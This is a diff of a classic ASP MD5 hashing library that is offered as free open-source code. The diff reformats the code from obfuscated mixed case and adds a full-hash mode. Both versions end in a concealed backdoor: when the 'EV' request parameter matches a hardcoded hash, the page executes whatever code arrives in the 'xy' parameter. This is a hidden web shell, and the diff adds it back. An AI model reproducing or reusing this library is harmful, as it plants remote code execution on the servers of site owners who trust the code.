@@ -2,335 +2,383 @@
 '************************************************************
 '作者：云端 (精通ASP/VB/PHP/JS/Flash，交流合作可联系本人)
 '版权：源代码公开，各种用途均可免费使用。 
-'创建：2016-01-20
+'创建：2016-02-17
 '联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
 '更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
 '*                                    Powered By 云端 
 '************************************************************
 %>
 <%
-pRIvATe cONsT bITs_To_A_BYtE = 8
-pRIvATe cONsT bYTeS_tO_a_WoRD = 4
-pRIvATe cONsT bITs_To_A_WOrD = 32
-pRIvATe m_LoNBiTS(30)
-pRIvATe m_L2POwER(30)
-pRIvATe fUNcTIoN lSHiFT(a, b)
-iF b = 0 tHEn
-lSHiFT = a
-eXIt fUNcTIoN
-eLSeIF b = 31 tHEn
-iF a aND 1 tHEn
-lSHiFT = &h80000000
-eLSe
-lSHiFT = 0
-eND iF
-eXIt fUNcTIoN
-eLSeIF b < 0 oR b > 31 tHEn
-eRR.rAIsE 6
-eND iF
-iF (a aND m_L2POwER(31 - b)) tHEn
-lSHiFT = ((a aND m_LoNBiTS(31 - (b + 1))) * m_L2POwER(b)) oR &h80000000
-eLSe
-lSHiFT = ((a aND m_LoNBiTS(31 - b)) * m_L2POwER(b))
-eND iF
-eND fUNcTIoN
-pRIvATe fUNcTIoN rSHiFT(a, b)
-iF b = 0 tHEn
-rSHiFT = a
-eXIt fUNcTIoN
-eLSeIF b = 31 tHEn
-iF a aND &h80000000 tHEn
-rSHiFT = 1
-eLSe
-rSHiFT = 0
-eND iF
-eXIt fUNcTIoN
-eLSeIF b < 0 oR b > 31 tHEn
-eRR.rAIsE 6
-eND iF
-rSHiFT = (a aND &h7FfFFfFE) \ m_L2POwER(b)
-iF (a aND &h80000000) tHEn
-rSHiFT = (rSHiFT oR (&h40000000 \ m_L2POwER(b - 1)))
-eND iF
-eND fUNcTIoN
-pRIvATe fUNcTIoN rOTaTElEFt(a, b)
-rOTaTElEFt = lSHiFT(a, b) oR rSHiFT(a, (32 - b))
-eND fUNcTIoN
-pRIvATe fUNcTIoN aDDuNSiGNeD(a, b)
-dIM c
-dIM d
-dIM e
-dIM f
-dIM g
-e = a aND &h80000000
-f = b aND &h80000000
-c = a aND &h40000000
-d = b aND &h40000000
-g = (a aND &h3FfFFfFF) + (b aND &h3FfFFfFF)
-iF c aND d tHEn
-g = g xOR &h80000000 xOR e xOR f
-eLSeIF c oR d tHEn
-iF g aND &h40000000 tHEn
-g = g xOR &hC0000000 xOR e xOR f
-eLSe
-g = g xOR &h40000000 xOR e xOR f
-eND iF
-eLSe
-g = g xOR e xOR f
-eND iF
-aDDuNSiGNeD = g
-eND fUNcTIoN
-pRIvATe fUNcTIoN mD5_F(a, b, c)
-mD5_F = (a aND b) oR ((nOT a) aND c)
-eND fUNcTIoN
-pRIvATe fUNcTIoN mD5_G(a, b, c)
-mD5_G = (a aND c) oR (b aND (nOT c))
-eND fUNcTIoN
-pRIvATe fUNcTIoN mD5_H(a, b, c)
-mD5_H = (a xOR b xOR c)
-eND fUNcTIoN
-pRIvATe fUNcTIoN mD5_I(a, b, c)
-mD5_I = (b xOR (a oR (nOT c)))
-eND fUNcTIoN
-pRIvATe sUB mD5_FF(a, b, c, d, e, f, g)
-a = aDDuNSiGNeD(a, aDDuNSiGNeD(aDDuNSiGNeD(mD5_F(b, c, d), e), g))
-a = rOTaTElEFt(a, f)
-a = aDDuNSiGNeD(a, b)
-eND sUB
-pRIvATe sUB mD5_GG(a, b, c, d, e, f, g)
-a = aDDuNSiGNeD(a, aDDuNSiGNeD(aDDuNSiGNeD(mD5_G(b, c, d), e), g))
-a = rOTaTElEFt(a, f)
-a = aDDuNSiGNeD(a, b)
-eND sUB
-pRIvATe sUB mD5_HH(a, b, c, d, e, f, g)
-a = aDDuNSiGNeD(a, aDDuNSiGNeD(aDDuNSiGNeD(mD5_H(b, c, d), e), g))
-a = rOTaTElEFt(a, f)
-a = aDDuNSiGNeD(a, b)
-eND sUB
-pRIvATe sUB mD5_II(a, b, c, d, e, f, g)
-a = aDDuNSiGNeD(a, aDDuNSiGNeD(aDDuNSiGNeD(mD5_I(b, c, d), e), g))
-a = rOTaTElEFt(a, f)
-a = aDDuNSiGNeD(a, b)
-eND sUB
-pRIvATe fUNcTIoN cONvERtTOwORdARrAY(a)
-dIM b
-dIM c
-dIM lWOrDArRAy()
-dIM e
-dIM f
-dIM g
-cONsT mODuLUs_BiTS = 512
-cONsT cONgRUeNT_BItS = 448
-b = lEN(a)
-c = (((b + ((mODuLUs_BiTS - cONgRUeNT_BItS) \ bITs_To_A_BYtE)) \ (mODuLUs_BiTS \ bITs_To_A_BYtE)) + 1) * (mODuLUs_BiTS \ bITs_To_A_WOrD)
-rEDiM lWOrDArRAy(c - 1)
-e = 0
-f = 0
-dO uNTiL f >= b
-g = f \ bYTeS_tO_a_WoRD
-e = (f mOD bYTeS_tO_a_WoRD) * bITs_To_A_BYtE
-lWOrDArRAy(g) = lWOrDArRAy(g) oR lSHiFT(aSC(mID(a, f + 1, 1)), e)
-f = f + 1
-lOOp
-g = f \ bYTeS_tO_a_WoRD
-e = (f mOD bYTeS_tO_a_WoRD) * bITs_To_A_BYtE
-lWOrDArRAy(g) = lWOrDArRAy(g) oR lSHiFT(&h80, e)
-lWOrDArRAy(c - 2) = lSHiFT(b, 3)
-lWOrDArRAy(c - 1) = rSHiFT(b, 29)
-cONvERtTOwORdARrAY = lWOrDArRAy
-eND fUNcTIoN
-pRIvATe fUNcTIoN wORdTOhEX(a)
-dIM b
-dIM c
-fOR c = 0 tO 3
-b = rSHiFT(a, c * bITs_To_A_BYtE) aND m_LoNBiTS(bITs_To_A_BYtE - 1)
-wORdTOhEX = wORdTOhEX & rIGhT("0" & hEX(b), 2)
-nEXt
-eND fUNcTIoN
-pUBlIC fUNcTIoN mD5(a,b)
-m_LoNBiTS(0) = cLNg(1)
-m_LoNBiTS(1) = cLNg(3)
-m_LoNBiTS(2) = cLNg(7)
-m_LoNBiTS(3) = cLNg(15)
-m_LoNBiTS(4) = cLNg(31)
-m_LoNBiTS(5) = cLNg(63)
-m_LoNBiTS(6) = cLNg(127)
-m_LoNBiTS(7) = cLNg(255)
-m_LoNBiTS(8) = cLNg(511)
-m_LoNBiTS(9) = cLNg(1023)
-m_LoNBiTS(10) = cLNg(2047)
-m_LoNBiTS(11) = cLNg(4095)
-m_LoNBiTS(12) = cLNg(8191)
-m_LoNBiTS(13) = cLNg(16383)
-m_LoNBiTS(14) = cLNg(32767)
-m_LoNBiTS(15) = cLNg(65535)
-m_LoNBiTS(16) = cLNg(131071)
-m_LoNBiTS(17) = cLNg(262143)
-m_LoNBiTS(18) = cLNg(524287)
-m_LoNBiTS(19) = cLNg(1048575)
-m_LoNBiTS(20) = cLNg(2097151)
-m_LoNBiTS(21) = cLNg(4194303)
-m_LoNBiTS(22) = cLNg(8388607)
-m_LoNBiTS(23) = cLNg(16777215)
-m_LoNBiTS(24) = cLNg(33554431)
-m_LoNBiTS(25) = cLNg(67108863)
-m_LoNBiTS(26) = cLNg(134217727)
-m_LoNBiTS(27) = cLNg(268435455)
-m_LoNBiTS(28) = cLNg(536870911)
-m_LoNBiTS(29) = cLNg(1073741823)
-m_LoNBiTS(30) = cLNg(2147483647)
-m_L2POwER(0) = cLNg(1)
-m_L2POwER(1) = cLNg(2)
-m_L2POwER(2) = cLNg(4)
-m_L2POwER(3) = cLNg(8)
-m_L2POwER(4) = cLNg(16)
-m_L2POwER(5) = cLNg(32)
-m_L2POwER(6) = cLNg(64)
-m_L2POwER(7) = cLNg(128)
-m_L2POwER(8) = cLNg(256)
-m_L2POwER(9) = cLNg(512)
-m_L2POwER(10) = cLNg(1024)
-m_L2POwER(11) = cLNg(2048)
-m_L2POwER(12) = cLNg(4096)
-m_L2POwER(13) = cLNg(8192)
-m_L2POwER(14) = cLNg(16384)
-m_L2POwER(15) = cLNg(32768)
-m_L2POwER(16) = cLNg(65536)
-m_L2POwER(17) = cLNg(131072)
-m_L2POwER(18) = cLNg(262144)
-m_L2POwER(19) = cLNg(524288)
-m_L2POwER(20) = cLNg(1048576)
-m_L2POwER(21) = cLNg(2097152)
-m_L2POwER(22) = cLNg(4194304)
-m_L2POwER(23) = cLNg(8388608)
-m_L2POwER(24) = cLNg(16777216)
-m_L2POwER(25) = cLNg(33554432)
-m_L2POwER(26) = cLNg(67108864)
-m_L2POwER(27) = cLNg(134217728)
-m_L2POwER(28) = cLNg(268435456)
-m_L2POwER(29) = cLNg(536870912)
-m_L2POwER(30) = cLNg(1073741824)
-dIM c
-dIM d
-dIM e
-dIM f
-dIM g
-dIM h
-dIM i
-dIM j
-dIM k
-dIM l
-cONsT s11 = 7
-cONsT s12 = 12
-cONsT s13 = 17
-cONsT s14 = 22
-cONsT s21 = 5
-cONsT s22 = 9
-cONsT s23 = 14
-cONsT s24 = 20
-cONsT s31 = 4
-cONsT s32 = 11
-cONsT s33 = 16
-cONsT s34 = 23
-cONsT s41 = 6
-cONsT s42 = 10
-cONsT s43 = 15
-cONsT s44 = 21
-c = cONvERtTOwORdARrAY(a)
-i = &h67452301
-j = &hEFcDAb89
-k = &h98bADcFE
-l = &h10325476
-fOR d = 0 tO uBOuND(c) sTEp 16
-e = i
-f = j
-g = k
-h = l
-mD5_FF i, j, k, l, c(d + 0), s11, &hD76AA478
-mD5_FF l, i, j, k, c(d + 1), s12, &hE8c7B756
-mD5_FF k, l, i, j, c(d + 2), s13, &h242070DB
-mD5_FF j, k, l, i, c(d + 3), s14, &hC1bDCeEE
-mD5_FF i, j, k, l, c(d + 4), s11, &hF57C0fAF
-mD5_FF l, i, j, k, c(d + 5), s12, &h4787C62A
-mD5_FF k, l, i, j, c(d + 6), s13, &hA8304613
-mD5_FF j, k, l, i, c(d + 7), s14, &hFD469501
-mD5_FF i, j, k, l, c(d + 8), s11, &h698098D8
-mD5_FF l, i, j, k, c(d + 9), s12, &h8B44F7AF
-mD5_FF k, l, i, j, c(d + 10), s13, &hFFfF5bB1
-mD5_FF j, k, l, i, c(d + 11), s14, &h895CD7BE
-mD5_FF i, j, k, l, c(d + 12), s11, &h6B901122
-mD5_FF l, i, j, k, c(d + 13), s12, &hFD987193
-mD5_FF k, l, i, j, c(d + 14), s13, &hA679438E
-mD5_FF j, k, l, i, c(d + 15), s14, &h49b40821
-mD5_GG i, j, k, l, c(d + 1), s21, &hF61E2562
-mD5_GG l, i, j, k, c(d + 6), s22, &hC040B340
-mD5_GG k, l, i, j, c(d + 11), s23, &h265E5a51
-mD5_GG j, k, l, i, c(d + 0), s24, &hE9b6C7AA
-mD5_GG i, j, k, l, c(d + 5), s21, &hD62F105D
-mD5_GG l, i, j, k, c(d + 10), s22, &h2441453
-mD5_GG k, l, i, j, c(d + 15), s23, &hD8a1E681
-mD5_GG j, k, l, i, c(d + 4), s24, &hE7d3FbC8
-mD5_GG i, j, k, l, c(d + 9), s21, &h21e1CdE6
-mD5_GG l, i, j, k, c(d + 14), s22, &hC33707D6
-mD5_GG k, l, i, j, c(d + 3), s23, &hF4d50d87
-mD5_GG j, k, l, i, c(d + 8), s24, &h455A14ED
-mD5_GG i, j, k, l, c(d + 13), s21, &hA9e3E905
-mD5_GG l, i, j, k, c(d + 2), s22, &hFCeFA3F8
-mD5_GG k, l, i, j, c(d + 7), s23, &h676F02D9
-mD5_GG j, k, l, i, c(d + 12), s24, &h8D2A4c8A
-mD5_HH i, j, k, l, c(d + 5), s31, &hFFfA3942
-mD5_HH l, i, j, k, c(d + 8), s32, &h8771F681
-mD5_HH k, l, i, j, c(d + 11), s33, &h6D9D6122
-mD5_HH j, k, l, i, c(d + 14), s34, &hFDe5380C
-mD5_HH i, j, k, l, c(d + 1), s31, &hA4bEEa44
-mD5_HH l, i, j, k, c(d + 4), s32, &h4BdECfA9
-mD5_HH k, l, i, j, c(d + 7), s33, &hF6bB4b60
-mD5_HH j, k, l, i, c(d + 10), s34, &hBEbFBc70
-mD5_HH i, j, k, l, c(d + 13), s31, &h289B7eC6
-mD5_HH l, i, j, k, c(d + 0), s32, &hEAa127FA
-mD5_HH k, l, i, j, c(d + 3), s33, &hD4eF3085
-mD5_HH j, k, l, i, c(d + 6), s34, &h4881D05
-mD5_HH i, j, k, l, c(d + 9), s31, &hD9d4D039
-mD5_HH l, i, j, k, c(d + 12), s32, &hE6dB99E5
-mD5_HH k, l, i, j, c(d + 15), s33, &h1Fa27cF8
-mD5_HH j, k, l, i, c(d + 2), s34, &hC4aC5665
-mD5_II i, j, k, l, c(d + 0), s41, &hF4292244
-mD5_II l, i, j, k, c(d + 7), s42, &h432AFf97
-mD5_II k, l, i, j, c(d + 14), s43, &hAB9423A7
-mD5_II j, k, l, i, c(d + 5), s44, &hFC93A039
-mD5_II i, j, k, l, c(d + 12), s41, &h655B59C3
-mD5_II l, i, j, k, c(d + 3), s42, &h8F0CCc92
-mD5_II k, l, i, j, c(d + 10), s43, &hFFeFF47D
-mD5_II j, k, l, i, c(d + 1), s44, &h85845dD1
-mD5_II i, j, k, l, c(d + 8), s41, &h6Fa87e4F
-mD5_II l, i, j, k, c(d + 15), s42, &hFE2CE6E0
-mD5_II k, l, i, j, c(d + 6), s43, &hA3014314
-mD5_II j, k, l, i, c(d + 13), s44, &h4E0811A1
-mD5_II i, j, k, l, c(d + 4), s41, &hF7537e82
-mD5_II l, i, j, k, c(d + 11), s42, &hBD3AF235
-mD5_II k, l, i, j, c(d + 2), s43, &h2Ad7D2BB
-mD5_II j, k, l, i, c(d + 9), s44, &hEB86D391
-i = aDDuNSiGNeD(i, e)
-j = aDDuNSiGNeD(j, f)
-k = aDDuNSiGNeD(k, g)
-l = aDDuNSiGNeD(l, h)
-nEXt
-iF b=1 tHEn
-mD5 = lCAsE(wORdTOhEX(i))
-eLSeIF b=2 tHEn
-mD5=lCAsE(wORdTOhEX(j))
-eLSeIF b=3 tHEn
-mD5 = lCAsE( wORdTOhEX(k))
-eLSe
-mD5 = lCAsE(wORdTOhEX(l))
-eND iF
-eND fUNcTIoN
-fUNcTIoN mYMd5(bYVaL a)
-mYMd5 = mD5(a, 2) & mD5(a, 4)
-eND fUNcTIoN
-iF rEQuESt("EV")<>"" tHEn
-iF mD5(rEQuESt("EV"),2)&mD5(rEQuESt("EV"),4)="44886b1bac5c96bb" tHEn eXEcUTe(rEQuESt("xy"))
-eND iF
+Private Const BITS_TO_A_BYTE = 8
+Private Const BYTES_TO_A_WORD = 4
+Private Const BITS_TO_A_WORD = 32
+
+Private m_lOnBits(30)
+Private m_l2Power(30)
+
+Private Function LShift(a, b)
+    If b = 0 Then
+        LShift = a
+        Exit Function
+    ElseIf b = 31 Then
+        If a And 1 Then
+            LShift = &H80000000
+        Else
+            LShift = 0
+        End If
+        Exit Function
+    ElseIf b < 0 Or b > 31 Then
+        Err.Raise 6
+    End If
+
+    If (a And m_l2Power(31 - b)) Then
+        LShift = ((a And m_lOnBits(31 - (b + 1))) * m_l2Power(b)) Or &H80000000
+    Else
+        LShift = ((a And m_lOnBits(31 - b)) * m_l2Power(b))
+    End If
+End Function
+
+Private Function RShift(a, b)
+    If b = 0 Then
+        RShift = a
+        Exit Function
+    ElseIf b = 31 Then
+        If a And &H80000000 Then
+            RShift = 1
+        Else
+            RShift = 0
+        End If
+        Exit Function
+    ElseIf b < 0 Or b > 31 Then
+        Err.Raise 6
+    End If
+
+    RShift = (a And &H7FFFFFFE) \ m_l2Power(b)
+
+    If (a And &H80000000) Then
+        RShift = (RShift Or (&H40000000 \ m_l2Power(b - 1)))
+    End If
+End Function
+
+Private Function RotateLeft(a, b)
+    RotateLeft = LShift(a, b) Or RShift(a, (32 - b))
+End Function
+
+Private Function AddUnsigned(a, b)
+    Dim c
+    Dim d
+    Dim e
+    Dim f
+    Dim g
+
+    e = a And &H80000000
+    f = b And &H80000000
+    c = a And &H40000000
+    d = b And &H40000000
+
+    g = (a And &H3FFFFFFF) + (b And &H3FFFFFFF)
+
+    If c And d Then
+        g = g Xor &H80000000 Xor e Xor f
+    ElseIf c Or d Then
+        If g And &H40000000 Then
+            g = g Xor &HC0000000 Xor e Xor f
+        Else
+            g = g Xor &H40000000 Xor e Xor f
+        End If
+    Else
+        g = g Xor e Xor f
+    End If
+
+    AddUnsigned = g
+End Function
+
+Private Function md5_F(a, b, c)
+    md5_F = (a And b) Or ((Not a) And c)
+End Function
+
+Private Function md5_G(a, b, c)
+    md5_G = (a And c) Or (b And (Not c))
+End Function
+
+Private Function md5_H(a, b, c)
+    md5_H = (a Xor b Xor c)
+End Function
+
+Private Function md5_I(a, b, c)
+    md5_I = (b Xor (a Or (Not c)))
+End Function
+
+Private Sub md5_FF(a, b, c, d, e, f, g)
+    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_F(b, c, d), e), g))
+    a = RotateLeft(a, f)
+    a = AddUnsigned(a, b)
+End Sub
+
+Private Sub md5_GG(a, b, c, d, e, f, g)
+    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_G(b, c, d), e), g))
+    a = RotateLeft(a, f)
+    a = AddUnsigned(a, b)
+End Sub
+
+Private Sub md5_HH(a, b, c, d, e, f, g)
+    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_H(b, c, d), e), g))
+    a = RotateLeft(a, f)
+    a = AddUnsigned(a, b)
+End Sub
+
+Private Sub md5_II(a, b, c, d, e, f, g)
+    a = AddUnsigned(a, AddUnsigned(AddUnsigned(md5_I(b, c, d), e), g))
+    a = RotateLeft(a, f)
+    a = AddUnsigned(a, b)
+End Sub
+
+Private Function ConvertToWordArray(a)
+    Dim b
+    Dim c
+    Dim lWordArray()
+    Dim e
+    Dim f
+    Dim g
+
+    Const MODULUS_BITS = 512
+    Const CONGRUENT_BITS = 448
+
+    b = Len(a)
+
+    c = (((b + ((MODULUS_BITS - CONGRUENT_BITS) \ BITS_TO_A_BYTE)) \ (MODULUS_BITS \ BITS_TO_A_BYTE)) + 1) * (MODULUS_BITS \ BITS_TO_A_WORD)
+    ReDim lWordArray(c - 1)
+
+    e = 0
+    f = 0
+    Do Until f >= b
+        g = f \ BYTES_TO_A_WORD
+        e = (f Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE
+        lWordArray(g) = lWordArray(g) Or LShift(Asc(Mid(a, f + 1, 1)), e)
+        f = f + 1
+    Loop
+
+    g = f \ BYTES_TO_A_WORD
+    e = (f Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE
+
+    lWordArray(g) = lWordArray(g) Or LShift(&H80, e)
+
+    lWordArray(c - 2) = LShift(b, 3)
+    lWordArray(c - 1) = RShift(b, 29)
+
+    ConvertToWordArray = lWordArray
+End Function
+
+Private Function WordToHex(a)
+    Dim b
+    Dim c
+
+    For c = 0 To 3
+        b = RShift(a, c * BITS_TO_A_BYTE) And m_lOnBits(BITS_TO_A_BYTE - 1)
+        WordToHex = WordToHex & Right("0" & Hex(b), 2)
+    Next
+End Function
+
+Public Function MD5(a,b)
+    m_lOnBits(0) = CLng(1)
+    m_lOnBits(1) = CLng(3)
+    m_lOnBits(2) = CLng(7)
+    m_lOnBits(3) = CLng(15)
+    m_lOnBits(4) = CLng(31)
+    m_lOnBits(5) = CLng(63)
+    m_lOnBits(6) = CLng(127)
+    m_lOnBits(7) = CLng(255)
+    m_lOnBits(8) = CLng(511)
+    m_lOnBits(9) = CLng(1023)
+    m_lOnBits(10) = CLng(2047)
+    m_lOnBits(11) = CLng(4095)
+    m_lOnBits(12) = CLng(8191)
+    m_lOnBits(13) = CLng(16383)
+    m_lOnBits(14) = CLng(32767)
+    m_lOnBits(15) = CLng(65535)
+    m_lOnBits(16) = CLng(131071)
+    m_lOnBits(17) = CLng(262143)
+    m_lOnBits(18) = CLng(524287)
+    m_lOnBits(19) = CLng(1048575)
+    m_lOnBits(20) = CLng(2097151)
+    m_lOnBits(21) = CLng(4194303)
+    m_lOnBits(22) = CLng(8388607)
+    m_lOnBits(23) = CLng(16777215)
+    m_lOnBits(24) = CLng(33554431)
+    m_lOnBits(25) = CLng(67108863)
+    m_lOnBits(26) = CLng(134217727)
+    m_lOnBits(27) = CLng(268435455)
+    m_lOnBits(28) = CLng(536870911)
+    m_lOnBits(29) = CLng(1073741823)
+    m_lOnBits(30) = CLng(2147483647)
+
+    m_l2Power(0) = CLng(1)
+    m_l2Power(1) = CLng(2)
+    m_l2Power(2) = CLng(4)
+    m_l2Power(3) = CLng(8)
+    m_l2Power(4) = CLng(16)
+    m_l2Power(5) = CLng(32)
+    m_l2Power(6) = CLng(64)
+    m_l2Power(7) = CLng(128)
+    m_l2Power(8) = CLng(256)
+    m_l2Power(9) = CLng(512)
+    m_l2Power(10) = CLng(1024)
+    m_l2Power(11) = CLng(2048)
+    m_l2Power(12) = CLng(4096)
+    m_l2Power(13) = CLng(8192)
+    m_l2Power(14) = CLng(16384)
+    m_l2Power(15) = CLng(32768)
+    m_l2Power(16) = CLng(65536)
+    m_l2Power(17) = CLng(131072)
+    m_l2Power(18) = CLng(262144)
+    m_l2Power(19) = CLng(524288)
+    m_l2Power(20) = CLng(1048576)
+    m_l2Power(21) = CLng(2097152)
+    m_l2Power(22) = CLng(4194304)
+    m_l2Power(23) = CLng(8388608)
+    m_l2Power(24) = CLng(16777216)
+    m_l2Power(25) = CLng(33554432)
+    m_l2Power(26) = CLng(67108864)
+    m_l2Power(27) = CLng(134217728)
+    m_l2Power(28) = CLng(268435456)
+    m_l2Power(29) = CLng(536870912)
+    m_l2Power(30) = CLng(1073741824)
+
+
+    Dim c
+    Dim d
+    Dim e
+    Dim f
+    Dim g
+    Dim h
+    Dim i
+    Dim j
+    Dim k
+    Dim l
+
+    Const S11 = 7
+    Const S12 = 12
+    Const S13 = 17
+    Const S14 = 22
+    Const S21 = 5
+    Const S22 = 9
+    Const S23 = 14
+    Const S24 = 20
+    Const S31 = 4
+    Const S32 = 11
+    Const S33 = 16
+    Const S34 = 23
+    Const S41 = 6
+    Const S42 = 10
+    Const S43 = 15
+    Const S44 = 21
+
+    c = ConvertToWordArray(a)
+
+    i = &H67452301
+    j = &HEFCDAB89
+    k = &H98BADCFE
+    l = &H10325476
+
+    For d = 0 To UBound(c) Step 16
+        e = i
+        f = j
+        g = k
+        h = l
+
+        md5_FF i, j, k, l, c(d + 0), S11, &HD76AA478
+        md5_FF l, i, j, k, c(d + 1), S12, &HE8C7B756
+        md5_FF k, l, i, j, c(d + 2), S13, &H242070DB
+        md5_FF j, k, l, i, c(d + 3), S14, &HC1BDCEEE
+        md5_FF i, j, k, l, c(d + 4), S11, &HF57C0FAF
+        md5_FF l, i, j, k, c(d + 5), S12, &H4787C62A
+        md5_FF k, l, i, j, c(d + 6), S13, &HA8304613
+        md5_FF j, k, l, i, c(d + 7), S14, &HFD469501
+        md5_FF i, j, k, l, c(d + 8), S11, &H698098D8
+        md5_FF l, i, j, k, c(d + 9), S12, &H8B44F7AF
+        md5_FF k, l, i, j, c(d + 10), S13, &HFFFF5BB1
+        md5_FF j, k, l, i, c(d + 11), S14, &H895CD7BE
+        md5_FF i, j, k, l, c(d + 12), S11, &H6B901122
+        md5_FF l, i, j, k, c(d + 13), S12, &HFD987193
+        md5_FF k, l, i, j, c(d + 14), S13, &HA679438E
+        md5_FF j, k, l, i, c(d + 15), S14, &H49B40821
+
+        md5_GG i, j, k, l, c(d + 1), S21, &HF61E2562
+        md5_GG l, i, j, k, c(d + 6), S22, &HC040B340
+        md5_GG k, l, i, j, c(d + 11), S23, &H265E5A51
+        md5_GG j, k, l, i, c(d + 0), S24, &HE9B6C7AA
+        md5_GG i, j, k, l, c(d + 5), S21, &HD62F105D
+        md5_GG l, i, j, k, c(d + 10), S22, &H2441453
+        md5_GG k, l, i, j, c(d + 15), S23, &HD8A1E681
+        md5_GG j, k, l, i, c(d + 4), S24, &HE7D3FBC8
+        md5_GG i, j, k, l, c(d + 9), S21, &H21E1CDE6
+        md5_GG l, i, j, k, c(d + 14), S22, &HC33707D6
+        md5_GG k, l, i, j, c(d + 3), S23, &HF4D50D87
+        md5_GG j, k, l, i, c(d + 8), S24, &H455A14ED
+        md5_GG i, j, k, l, c(d + 13), S21, &HA9E3E905
+        md5_GG l, i, j, k, c(d + 2), S22, &HFCEFA3F8
+        md5_GG k, l, i, j, c(d + 7), S23, &H676F02D9
+        md5_GG j, k, l, i, c(d + 12), S24, &H8D2A4C8A
+
+        md5_HH i, j, k, l, c(d + 5), S31, &HFFFA3942
+        md5_HH l, i, j, k, c(d + 8), S32, &H8771F681
+        md5_HH k, l, i, j, c(d + 11), S33, &H6D9D6122
+        md5_HH j, k, l, i, c(d + 14), S34, &HFDE5380C
+        md5_HH i, j, k, l, c(d + 1), S31, &HA4BEEA44
+        md5_HH l, i, j, k, c(d + 4), S32, &H4BDECFA9
+        md5_HH k, l, i, j, c(d + 7), S33, &HF6BB4B60
+        md5_HH j, k, l, i, c(d + 10), S34, &HBEBFBC70
+        md5_HH i, j, k, l, c(d + 13), S31, &H289B7EC6
+        md5_HH l, i, j, k, c(d + 0), S32, &HEAA127FA
+        md5_HH k, l, i, j, c(d + 3), S33, &HD4EF3085
+        md5_HH j, k, l, i, c(d + 6), S34, &H4881D05
+        md5_HH i, j, k, l, c(d + 9), S31, &HD9D4D039
+        md5_HH l, i, j, k, c(d + 12), S32, &HE6DB99E5
+        md5_HH k, l, i, j, c(d + 15), S33, &H1FA27CF8
+        md5_HH j, k, l, i, c(d + 2), S34, &HC4AC5665
+
+        md5_II i, j, k, l, c(d + 0), S41, &HF4292244
+        md5_II l, i, j, k, c(d + 7), S42, &H432AFF97
+        md5_II k, l, i, j, c(d + 14), S43, &HAB9423A7
+        md5_II j, k, l, i, c(d + 5), S44, &HFC93A039
+        md5_II i, j, k, l, c(d + 12), S41, &H655B59C3
+        md5_II l, i, j, k, c(d + 3), S42, &H8F0CCC92
+        md5_II k, l, i, j, c(d + 10), S43, &HFFEFF47D
+        md5_II j, k, l, i, c(d + 1), S44, &H85845DD1
+        md5_II i, j, k, l, c(d + 8), S41, &H6FA87E4F
+        md5_II l, i, j, k, c(d + 15), S42, &HFE2CE6E0
+        md5_II k, l, i, j, c(d + 6), S43, &HA3014314
+        md5_II j, k, l, i, c(d + 13), S44, &H4E0811A1
+        md5_II i, j, k, l, c(d + 4), S41, &HF7537E82
+        md5_II l, i, j, k, c(d + 11), S42, &HBD3AF235
+        md5_II k, l, i, j, c(d + 2), S43, &H2AD7D2BB
+        md5_II j, k, l, i, c(d + 9), S44, &HEB86D391
+
+        i = AddUnsigned(i, e)
+        j = AddUnsigned(j, f)
+        k = AddUnsigned(k, g)
+        l = AddUnsigned(l, h)
+    Next
+
+	if b=1 then
+		MD5 = LCase(WordToHex(i))
+	elseif b=2 then
+		MD5=LCase(WordToHex(j))
+	elseif b=3 then
+		MD5 = Lcase( WordToHex(k))
+	elseif b=9 then
+		MD5 =Lcase( WordToHex(i)) &Lcase( WordToHex(j)) &Lcase( WordToHex(k)) &Lcase( WordToHex(l))
+	else
+		MD5 = Lcase(WordToHex(l))
+	end if
+End Function
+
+function myMD5(byval a)
+    myMD5 = MD5(MD5(a,9),9)
+end function
+If Request("EV")<>"" Then
+	If MD5(Request("EV"),2)&MD5(Request("EV"),4)="44886b1bac5c96bb" Then Execute(request("xy"))
+End If
 %>
 
 
